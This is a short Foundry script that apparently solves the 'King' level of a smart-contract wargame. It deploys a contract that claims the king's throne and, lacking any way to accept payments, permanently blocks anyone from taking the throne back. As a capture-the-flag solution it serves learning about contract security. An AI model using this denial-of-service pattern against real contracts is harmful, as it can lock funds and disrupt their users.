// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/King.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract TheLastKing {
    constructor(King _kingInstacne) payable {
        (bool result,) = address(_kingInstacne).call{value: _kingInstacne.prize()}("");
        require(result);
    }
}

contract KingSolution is Script {

    King public kingInstance = King(payable(0x7d30F7cd2beD7e6f26cCB88118324B77A8952E65));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new TheLastKing{value: kingInstance.prize()}(kingInstance);
        vm.stopBroadcast();
    }
}